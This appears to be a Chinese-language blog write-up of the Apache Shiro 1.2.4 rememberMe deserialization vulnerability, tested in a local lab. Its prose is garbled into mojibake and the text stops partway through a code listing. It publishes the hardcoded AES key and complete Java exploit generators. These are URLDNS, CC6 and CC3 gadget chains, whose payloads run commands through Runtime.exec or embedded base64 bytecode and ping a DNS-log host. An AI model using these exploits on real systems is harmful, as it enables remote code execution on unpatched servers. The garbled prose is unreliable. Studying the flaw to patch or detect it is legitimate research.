---
layout: mypost
title: "ShiroÂèçÂ∫èÂàóÂåñÊºèÊ¥û"
categories: [JavaÂÆâÂÖ®]
---

## ÂâçË®Ä

ËÄ≥ÁÜüËÉΩËØ¶ÁöÑ Shiro ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåÂ≠¶ CC„ÄÅCB Èìæ ‚õìÔ∏è‚Äçüí• ÁöÑÊó∂ÂÄôÊõ¥Â§öÁöÑÊòØÊääÊûÑÈÄ†Â•ΩÁöÑÊÅ∂ÊÑèÁ±ªÈÄöËøáËá™ÂÜôÁöÑ serializeObject ÊñπÊ≥ïÂ∫èÂàóÂåñ‰∏∫ ser.binÔºå‰πãÂêéÂÜçÊâãÂä®Ë∞ÉÁî®Ëá™ÂÜôÁöÑ unSerializeObject ÊñπÊ≥ïÂ∞ÜÊÅ∂ÊÑèÂ≠óËäÇÊµÅÊñá‰ª∂Ôºàser.binÔºâÂèçÂ∫èÂàóÂåñÔºå‰ªéËÄåËß¶Âèë readObjectÔºàEntryClassÔºâ-->Gadgets-->SinkÔºåÁúüÂÆûÊîªÈò≤‰∏≠ÊúçÂä°Âô®‰∏çÂèØËÉΩÂπ≥ÁôΩÊó†ÊïÖÁöÑÂéªÂèçÂ∫èÂàóÂåñ‰∏Ä‰∏™ÊÅ∂ÊÑèÂ≠óËäÇÊµÅÔºåÁúüÁöÑ‰ºöÊúâËøôÁßçÂäüËÉΩÂêóÔºüÂΩìÁÑ∂ÔºåÂÄüÂä© Shiro Ê°ÜÊû∂‰∏≠ÁöÑ‰∏Ä‰∏™Êú∫Âà∂Â∞±ÂèØ‰ª•ÂÅöÂà∞-->rememberMe Cookie„ÄÇÊâÄ‰ª•ËØ¥ Shiro ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁÆóÊòØ‰∏ÄÊ¨°ÂØπÁêÜËÆ∫ÁöÑÊàêÂäüÂÆûË∑µ„ÄÇ

## ÂáÜÂ§áÂ∑•‰Ωú

1.JDK 8u65„ÄÅTomcat 8.5.61Ôºà‰ªÖ‰æõÂèÇËÄÉÔºâ

2.Shiro 1.2.4ÔºàShiro ÁâàÊú¨È´ò‰∫é 1.2.4 Ê≤°ÊúâËØ•ÊºèÊ¥ûÔºâÔºåËøôÈáåÊ≤°ÂéªÂÆòÁΩë‰∏ãËΩΩÔºåÁõ¥Êé• clone ÁöÑËøô‰∏™È°πÁõÆ-->[P Á•ûÁöÑ ShiroDemo](https://github.com/phith0n/JavaThings/tree/master/shirodemo)ÔºåËøô‰∏™È°πÁõÆÂÅö‰∫Ü‰∏â‰ª∂‰∫ãÔºåÂÜô‰∫ÜÊºÇ‰∫ÆÁöÑ JSP È°µÈù¢„ÄÅÊ∑ªÂä†Â•Ω‰∫ÜÂøÖË¶ÅÁöÑ Maven ‰æùËµñ„ÄÅÂ∞ÜÈ°πÁõÆÊâìÂåÖÊàê‰∫Ü war ÂåÖ„ÄÇÁùÄÈáçÁúã‰∏Ä‰∏ã Maven ‰æùËµñÈÉ®ÂàÜ‰ªãÁªçÔºàÂÆåÂÖ®Á≤òËá™ P Á•ûÔºâ-->

```
shiro-core„ÄÅshiro-webÔºåËøôÊòØshiroÊú¨Ë∫´ÁöÑ‰æùËµñ
javax.servlet-api„ÄÅjsp-apiÔºåËøôÊòØJSPÂíåServletÁöÑ‰æùËµñÔºå‰ªÖÂú®ÁºñËØëÈò∂ÊÆµ‰ΩøÁî®ÔºåÂõ†‰∏∫Tomcat‰∏≠Ëá™Â∏¶Ëøô
‰∏§‰∏™‰æùËµñ
slf4j-api„ÄÅslf4j-simpleÔºåËøôÊòØ‰∏∫‰∫ÜÊòæÁ§∫shiro‰∏≠ÁöÑÊä•Èîô‰ø°ÊÅØÊ∑ªÂä†ÁöÑ‰æùËµñ
commons-loggingÔºåËøôÊòØshiro‰∏≠Áî®Âà∞ÁöÑ‰∏Ä‰∏™Êé•Âè£Ôºå‰∏çÊ∑ªÂä†‰ºöÁàÜ
java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory ÈîôËØØ
commons-collectionsÔºå‰∏∫‰∫ÜÊºîÁ§∫ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåÂ¢ûÂä†‰∫Ücommons-collections‰æùËµñ
```

TipsÔºöÂéüÁîüÁöÑ Shiro Ê°ÜÊû∂‰∏≠Â∏¶ÁùÄ commons-collections ‰æùËµñÔºàÊòØ commons-beanutils ‰æùËµñÂ∏¶ÁùÄÂÆÉÔºâ-->

![alt text](image-161.png)

‰ΩÜÂÆûÈôÖ‰∏äÊòØ‰∏çÂèØ‰ª•‰ΩøÁî®ÁöÑÔºåÂéüÂõ†Â¶Ç‰∏ã-->

![alt text](image-162.png)

Âõ†‰∏∫‰πãÂêéË¶ÅÂéªÁî® CC6 Êù•ÊºîÁ§∫ÊºèÊ¥ûÔºåÊâÄ‰ª•ÂéªÊâãÂä®Ê∑ª‰∫Ü‰∏Ä‰∏™ commons-collections-3.2.1 ÁöÑ‰æùËµñ„ÄÇ

3.IDEA ÈÖçÁΩÆ TomcatÔºåËøêË°å ShiroDemo È°πÁõÆÔºåÊàêÂäüËøêË°åÂêéÁöÑÁïåÈù¢Â¶Ç‰∏ã-->

![alt text](image-163.png)

## ÊºèÊ¥ûÂéüÁêÜ

Shiro ÁöÑ rememberMe Cookie Êú¨Ë∫´ËÆæËÆ°ÊòØ‰∏∫‰∫ÜËÆ©ÊµèËßàÂô®ÊàñÊúçÂä°Âô®ÈáçÂêØÂêéÁî®Êà∑‰∏ç‰∏¢Â§±ÁôªÂΩïÁä∂ÊÄÅÔºåÊîØÊåÅÂ∞ÜÊåÅ‰πÖÂåñ‰ø°ÊÅØÂ∫èÂàóÂåñÂπ∂Âä†ÂØÜÂêé‰øùÂ≠òÂú® Cookie ÁöÑ rememberMe Â≠óÊÆµ‰∏≠Ôºå‰∏ãÊ¨°ËØªÂèñÊó∂ËøõË°åËß£ÂØÜÂÜçÂèçÂ∫èÂàóÂåñÔºåËøô‰∏™ËÆæËÆ°ÂíåÂæàÂêàÁêÜÁöÑ„ÄÇÂÆÉÁöÑÊï¥‰ΩìÊµÅÁ®ãÂ¶Ç‰∏ã-->

```
1.Áî®Êà∑ÁôªÂΩïÂãæÈÄâËÆ∞‰ΩèÂØÜÁ†Å

2.ÊàêÂäüÁôªÈôÜÂêéÔºåÁî®Êà∑‰ø°ÊÅØË¢´Âä†ÂØÜÔºåÂä†ÂØÜÊµÅÁ®ãÔºö
Áî®Êà∑‰ø°ÊÅØ-->Â∫èÂàóÂåñ-->AESÂä†ÂØÜÔºàËøô‰∏ÄÊ≠•ÈúÄË¶ÅÁî®ÂØÜÈí•keyÔºâ-->base64ÁºñÁ†Å-->Ê∑ªÂä†Âà∞RememberMeÂ≠óÊÆµ

3.ÊúçÂä°Á´ØËøîÂõûRememberMeÁöÑÂÄºÁªôÂÆ¢Êà∑Á´Ø

4.‰∏ãÊ¨°ÁôªÂΩïÊó∂ÔºåÂÆ¢Êà∑Á´ØËØ∑Ê±ÇÂåÖCookie‰∏≠Êê∫Â∏¶RememberMeÂ≠óÊÆµ

5.ÊúçÂä°Á´Ø‰ºöËøõË°åË∫´‰ªΩÈ™åËØÅÔºåÂØπRememberMeÂ≠óÊÆµÁöÑÂÄºËøõË°åËß£ÂØÜÔºåËß£ÂØÜÊµÅÁ®ãÔºö
RememberMeÂ≠óÊÆµ-->base64Ëß£Á†Å-->AESËß£ÂØÜÔºàËøô‰∏ÄÊ≠•ÈúÄË¶ÅÁî®ÂØÜÈí•keyÔºâ-->ÂèçÂ∫èÂàóÂåñ-->Áî®Êà∑‰ø°ÊÅØ

6.Êó†ÈúÄÁôªÂΩïÂç≥ÂèØËÆøÈóÆ
```

ÈóÆÈ¢òÂ∞±Âá∫Áé∞Âú®‰∫é AES Âä†ÂØÜÂíåËß£ÂØÜÁöÑÂØÜÈí• keyÔºåÂú® Shiro 1.2.4 ÁâàÊú¨‰πãÂâçÂÜÖÁΩÆ‰∫Ü‰∏Ä‰∏™ÈªòËÆ§‰∏îÂõ∫ÂÆöÁöÑÂä†ÂØÜ KeyÔºåÂØºËá¥ÊîªÂáªËÄÖÂèØ‰ª•‰º™ÈÄ†ÊÅ∂ÊÑèÂ≠óËäÇÊµÅÂΩìÂÅö rememberMe Â≠óÊÆµÔºåËøõËÄåÂú®ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôËß¶Âèë readObjectÔºàEntryClassÔºâ-->Gadgets-->Sink„ÄÇ

‰∏ãÊñ≠ÁÇπË∞ÉËØï‰∏Ä‰∏ãÊï¥‰∏™Ëß£ÂØÜÁöÑËøáÁ®ã„ÄÇ

## Ë∞ÉËØï‰ª£Á†Å

1.ÂÖ®Â±ÄÊêúÁ¥¢ üîçRememberMeÔºåÂÆö‰ΩçÂà∞ CookieRememberMeManager Á±ªÁöÑ getRememberedSerializedIdentity ÊñπÊ≥ï

![alt text](image-164.png)

ÊòØ‰∏Ä‰∏™ Base64 Ëß£ÂØÜÁöÑÂáΩÊï∞ÔºåÊü•Áúã getRememberedSerializedIdentity ÊñπÊ≥ïÁöÑË∞ÉÁî®ÔºåÂÆö‰ΩçÂà∞ AbstractRememberMeManager Á±ªÁöÑ getRememberedPrincipals ÊñπÊ≥ï

![alt text](image-165.png)

![alt text](image-166.png)

ÂèØËßÅ convertBytesToPrincipals ÊñπÊ≥ïÂç≥ÊòØ AES Ëß£ÂØÜÁõ∏ÂÖ≥ÁöÑÂáΩÊï∞ÔºåÊü•ÁúãÊñπÊ≥ïÂÖ∑‰ΩìÂÜÖÂÆπÂ¶Ç‰∏ã-->

![alt text](image-167.png)

ÂÅö‰∫Ü‰∏ÄÊ¨° AES Ëß£ÂØÜÔºå‰∏îËøõË°å‰∫ÜÂèçÂ∫èÂàóÂåñÊìç‰Ωú

2.ËæìÂÖ•Ê≠£Á°ÆË¥¶ÂØÜÂπ∂ÂãæÈÄâ Remember me ÊàêÂäüÁôªÈôÜÂêéÔºå‰æùÊ¨°‰∏ãÂ•ΩÊñ≠ÁÇπÔºåÂÜçÊ¨°ËÆøÈóÆ`http://192.168.1.80:8888/shirodemo_war/`ÊäìÂà∞ÂåÖÂ¶Ç‰∏ã-->

![alt text](image-169.png)

Ê≠§Êó∂ËØ∑Ê±Ç‰πüÂà∞‰∫ÜÊñ≠ÁÇπÂ§Ñ

![alt text](image-168.png)

ËøõË°å Base64 Ëß£ÂØÜ

![alt text](image-171.png)

ËøõË°å AES Ëß£ÂØÜ

![alt text](image-170.png)

3.ÂÖ∂‰∏≠`getDecryptionCipherKey()`ÊñπÊ≥ïÁî®‰∫éËé∑Âèñ KeyÔºàAES ÁöÑÂØÜÈí•ÔºâÔºåËøô‰∏™ Key ÊòØÂõ∫ÂÆöÁöÑÔºåË∑ü‰∏Ä‰∏ã-->

![alt text](image-172.png)

![alt text](image-173.png)

![alt text](image-175.png)

![alt text](image-174.png)

![alt text](image-176.png)

![alt text](image-177.png)

ÊúÄÂêéË∑üÂà∞Ëøô‰∏ÄË°å‰ª£Á†Å`private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");`ÔºåÂèØËßÅ Key ÊòØÂõ∫ÂÆöÁöÑÔºåÂØÜÈí•Êö¥Èú≤‰∫ÜÈÇ£‰πàÊîªÂáªËÄÖÂ∞±ÂèØ‰ª•‰º™ÈÄ†‰∏Ä‰∏™ rememberMe Â≠óÊÆµ„ÄÇ

4.ÁªßÁª≠Ë∑üÊµÅÁ®ãÔºåÊé•‰∏ãÊù•Âà∞ÂèçÂ∫èÂàóÂåñ-->

![alt text](image-178.png)

![alt text](image-179.png)

ÂèçÂ∫èÂàóÂåñÂêéÊàêÂäüËé∑Âæó‰∏Ä‰∏™ÂØπË±°Ôºå‰πüÂ∞±ÊòØÁôªÂΩïÊàêÂäüÁöÑÁî®Êà∑‰ø°ÊÅØ

![alt text](image-180.png)

Ê≠§Êó∂È°µÈù¢ÊòæÁ§∫ÁôªÂΩïÊàêÂäü

![alt text](image-181.png)

## ÊûÑÈÄ† Poc

ÊÄùË∑ØÂæàÊ∏ÖÊô∞‰∫ÜÔºåÊîªÂáªËøáÁ®ãÂ¶Ç‰∏ã-->

```
1.‰ΩøÁî®URLDNSÈìæÁîüÊàê‰∏Ä‰∏™Â∫èÂàóÂåñPayload
2.‰ΩøÁî®ShiroÈªòËÆ§KeyËøõË°åÂä†ÂØÜ
3.Â∞ÜÂØÜÊñá‰Ωú‰∏∫Cookie‰∏≠rememberMeÁöÑÂÄºÂèëÈÄÅÁªôÊúçÂä°Á´Ø
```

‰ª£Á†ÅÂ¶Ç‰∏ã-->

```java
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class ShiroURLDNS {
    public static void main(String[] args) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        HashMap<URL,Integer> hashmap= new HashMap<URL,Integer>();
        URL url = new URL("http://6y7d5.cxsys.spacestabs.top");
        hashmap.put(url,1);
        Class<?> clazz = url.getClass();
        Field field = clazz.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url,-1);
        objectOutputStream.writeObject(hashmap);
        byte[] payloads = byteArrayOutputStream.toByteArray();
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
        objectOutputStream.close();
    }
}
```

ÁîüÊàêÁöÑ Payload Â¶Ç‰∏ã-->

![alt text](image-182.png)

Â∞ÜÁîüÊàêÁöÑ Payload ÊâìÂÖ• Cookie ÁöÑ rememberMe Â≠óÊÆµÔºåÂç≥ÂèØËß¶ÂèëÊºèÊ¥û-->

![alt text](image-183.png)

![alt text](image-48.png)

## ÊûÑÈÄ† EXP

Êãø CC6 ËØïÁùÄÊâì‰∏Ä‰∏ãÔºå‰ª£Á†ÅÂ¶Ç‰∏ã-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class ShiroCC6 {
    public static void main(String[] args) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "abc");
        HashMap<TiedMapEntry,Integer> entryMap = new HashMap<TiedMapEntry,Integer>();
        Class<?> clazzTiedMapEntry = tiedMapEntry.getClass();
        Field field = clazzTiedMapEntry.getDeclaredField("map");
        field.setAccessible(true);
        field.set(tiedMapEntry,new HashMap());
        entryMap.put(tiedMapEntry, 1);
        field.set(tiedMapEntry,lazyMap);
        objectOutputStream.writeObject(entryMap);
        byte[] payloads = byteArrayOutputStream.toByteArray();
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
        objectOutputStream.close();
    }
}
```

ÂèëÈÄÅ Payload

![alt text](image-185.png)

‰ΩÜÊòØ DNSlog Âπ≥Âè∞Âπ∂Ê≤°ÊúâÊî∂Âà∞ËØ∑Ê±ÇÔºå‰∏î Tomcat Âá∫Áé∞Êä•ÈîôÂ¶Ç‰∏ãÔºàÁúÅÁï•‰∫Ü‰∏Ä‰∫õ‰∏úË•øÔºâ-->

```
[http-nio-8888-exec-8] WARN org.apache.shiro.mgt.DefaultSecurityManager - Delegate RememberMeManager instance of type [org.apache.shiro.web.mgt.CookieRememberMeManager] threw an exception during getRememberedPrincipals().
org.apache.shiro.io.SerializationException: Unable to deserialze argument byte array.
    at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:82)
    at org.apache.shiro.mgt.AbstractRememberMeManager.deserialize(AbstractRememberMeManager.java:514)
    at org.apache.shiro.mgt.AbstractRememberMeManager.convertBytesToPrincipals
    ......
Caused by: java.lang.ClassNotFoundException: Unable to load ObjectStreamClass [[Lorg.apache.commons.collections.Transformer;: static final long serialVersionUID = -4803604734341277543L;]:
    at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:55)
    at java.base/java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:2055)
    at java.base/java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1915)
    ......
Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.
    at org.apache.shiro.util.ClassUtils.forName(ClassUtils.java:148)
    at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53)
    ......
```

‰∏Ä‰∏™ÂèçÂ∫èÂàóÂåñÂºÇÂ∏∏ÔºåËØ¥Êòé Shiro Âú®Â∞ùËØï‰ªéÂ≠òÂÇ®‰∏≠ËØªÂèñ rememberMe Êï∞ÊçÆÊó∂ÈÅáÂà∞‰∫ÜÈóÆÈ¢ò„ÄÇÁâπÂà´ÊòØ ClassNotFoundException Âíå UnknownClassException ÊèêÁ§∫ Shiro ËØïÂõæÂä†ËΩΩ‰∏Ä‰∏™Á±ª (org.apache.commons.collections.Transformer)Ôºå‰ΩÜÊòØÂ§±Ë¥•‰∫Ü„ÄÇË∞ÉËØï‰∏Ä‰∏ã-->

ÊòØ‰∏ãÈù¢ËøôÈáåËß¶ÂèëÁöÑÊä•Èîô

![alt text](image-187.png)

ÂàÜÊûêÊï∞ÊçÆÊµÅÔºåÂ¶Ç‰∏ã

![alt text](image-186.png)

ÂèëÁé∞`THREAD_CL_ACCESSOR.loadClass(fqcn)`„ÄÅ`CLASS_CL_ACCESSOR.loadClass(fqcn);`„ÄÅ`SYSTEM_CL_ACCESSOR.loadClass(fqcn)`Âùá‰∏∫ null ÁÑ∂ÂêéÊâç‰ºöËß¶ÂèëÊä•ÈîôÔºå‰πüÂ∞±ÊòØËøô‰∏â‰∏™Á±ªÂä†ËΩΩÂô®ÈÉΩÊ≤°ÊúâÂéªÂä†ËΩΩÂà∞Ëøô‰∏™Á±ª`org.apache.commons.collections.Transformer`„ÄÇ

ËÄå loadClass ÂèàÊòØ‰∏ãÈù¢ËøôÈáåÂéªË∞ÉÁî®ÁöÑ

![alt text](image-188.png)

resolveClass ÂæàÁÜüÊÇâ‰∫ÜÔºåresolveClass ÊòØÂèçÂ∫èÂàóÂåñ‰∏≠Áî®Êù•Êü•ÊâæÁ±ªÁöÑÊñπÊ≥ïÔºåÁÆÄÂçïÊù•ËØ¥ÔºåËØªÂèñÂ∫èÂàóÂåñÊµÅÁöÑÊó∂ÂÄôÔºåËØªÂà∞‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÂΩ¢
ÂºèÁöÑÁ±ªÂêçÔºåÈúÄË¶ÅÈÄöËøáËøô‰∏™ÊñπÊ≥ïÊù•ÊâæÂà∞ÂØπÂ∫îÁöÑ java.lang.Class ÂØπË±°„ÄÇ

Ëá≥Ê≠§Êä•ÈîôÂéüÂõ†Â∞±ÊòØÂõ†‰∏∫ Shiro Ê°ÜÊû∂‰∏≠ ClassResolvingObjectInputStream Á±ªÈáçÂÜô‰∫Ü resolveClass ÊñπÊ≥ïÔºåÊñπÊ≥ï‰∏≠ÁöÑ`ClassUtils.forName(osc.getName());`Ëøô‰∏ÄË°å‰ª£Á†ÅÊ≤°ËÉΩÊàêÂäüÁöÑÂä†ËΩΩÂà∞ Transformer Á±ª„ÄÇ

ÁúãÁúã ClassResolvingObjectInputStream Á±ªÁà∂Á±ªÁöÑ resolveClass ÊñπÊ≥ïÔºåÂ¶Ç‰∏ã-->

![alt text](image-189.png)

ÂèØ‰ª•ÂèëÁé∞‰∏Ä‰∏™ÊòØ`org.apache.shiro.util.ClassUtils#forName`Ôºå‰∏Ä‰∏™ÊòØ`java.lang.Class#forName`ÔºåÂâçËÄÖ‰∏çÂèØ‰ª•Âä†ËΩΩ Transformer Á±ªÔºåÂêéËÄÖÂèØ‰ª•Âä†ËΩΩ Transformer Á±ª„ÄÇËØ¶ÁªÜÂéüÂõ†ËÆ∞ÂΩïÂú®Âè¶‰∏ÄÁØáÊñáÁ´†‰∏≠-->[Shiro's buggy classloader]()„ÄÇ

ËøôÈáå‰ªÖÁªôÂá∫ÁªìËÆ∫Ôºö Shiro uses a buggy classloader that is unable to deserialize any arraysÔºÅÂ¶ÇÊûúÂèçÂ∫èÂàóÂåñÊµÅ‰∏≠ÂåÖÂê´Èùû Java Ëá™Ë∫´ÁöÑÊï∞ÁªÑÔºåÂàô‰ºöÂá∫Áé∞Êó†Ê≥ïÂä†ËΩΩÁ±ªÁöÑÈîôËØØÔºåÂõ†‰∏∫ CC6 ‰∏≠Áî®Âà∞‰∫Ü Transformer Êï∞ÁªÑÔºåÊâÄ‰ª•‰ºöÂá∫Áé∞Êä•Èîô„ÄÇ

## Ëß£ÂÜ≥ÊñπÊ°à

Áé∞Âú®Ëß£ÂÜ≥ÊñπÊúâ‰∏§ÁßçÔºöÊîπÂÜô CC6 ÁöÑ PayloadÔºåËÆ©ÂÆÉ‰∏çÂ∏¶ Transformer Êï∞ÁªÑ„ÄÅÊää ParallelWebappClassLoader ‰Ωú‰∏∫Á±ªÂä†ËΩΩÂô®ÂéªÂä†ËΩΩ Transformer Á±ª„ÄÇ

1.ÈÄâÊã©ÂÖàÊîπÂÜô CC3ÔºàÂü∫‰∫é CC6 ÁöÑÁâàÊú¨ÔºâÔºåÂõ†‰∏∫ÂÆÉÁöÑ transformers Êï∞ÁªÑÈïøÂ∫¶‰∏∫ 2ÔºåCC6 ÁöÑ transformers Êï∞ÁªÑÈïøÂ∫¶‰∏∫ 4ÔºåËÇØÂÆöË∂äÂ∞ëË∂äÂ•Ω„ÄÇCC3 ÁöÑ transformers ‰∏Ä‰∏™ÊòØ ConstantTransformerÔºå‰∏Ä‰∏™ÊòØ InstantiateTransformerÔºåÁ≤ò‰∏Ä‰∏ã-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3  {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwACgALBwAwDAAxADIBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoANQEAA0ROUwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACAAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAEAAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAEQAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAsACQAOAAwADAANAA0AFgAPAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACQ=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        Class<?> clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templatesImpl}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "abc");
        HashMap<TiedMapEntry,Integer> entryMap = new HashMap<TiedMapEntry,Integer>();
        Class<?> clazzTiedMapEntry = tiedMapEntry.getClass();
        Field field = clazzTiedMapEntry.getDeclaredField("map");
        field.setAccessible(true);
        field.set(tiedMapEntry,new HashMap());
        entryMap.put(tiedMapEntry, 1);
        field.set(tiedMapEntry,lazyMap);
        serializeObject(entryMap);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
